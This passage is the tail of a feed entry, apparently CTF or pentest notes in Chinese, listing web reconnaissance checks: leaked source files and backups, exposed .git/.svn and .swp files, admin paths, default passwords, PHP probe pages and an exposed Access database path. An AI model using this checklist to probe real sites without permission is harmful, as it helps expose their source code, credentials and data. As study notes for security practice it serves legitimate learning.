<li>phps源码泄露     index.phps</li>
<li>网站源码 www.zip</li>
<li>版本控制工具git     svn  .git .svn</li>
<li>Linux     vim异常关闭 保留临时文件.swp index.php.swp</li>
<li>cookie</li>
<li>查看域名 http://dbcha.com/</li>
<li>/admin 后台</li>
<li>网站中找到技术文件document     查看默认账号密码</li>
<li>源码泄露editor信息</li>
<li>公开信息qq信息 - 密保</li>
<li>网站测试探针 雅黑探针 /tz.php     查看php参数 - phpinfo</li>
<li>前端出现密钥 hackbar     post提交</li>
<li>asp+access框架数据库   /db/db.mdb</li>
</ul>
]]></content>
    </entry>
</feed>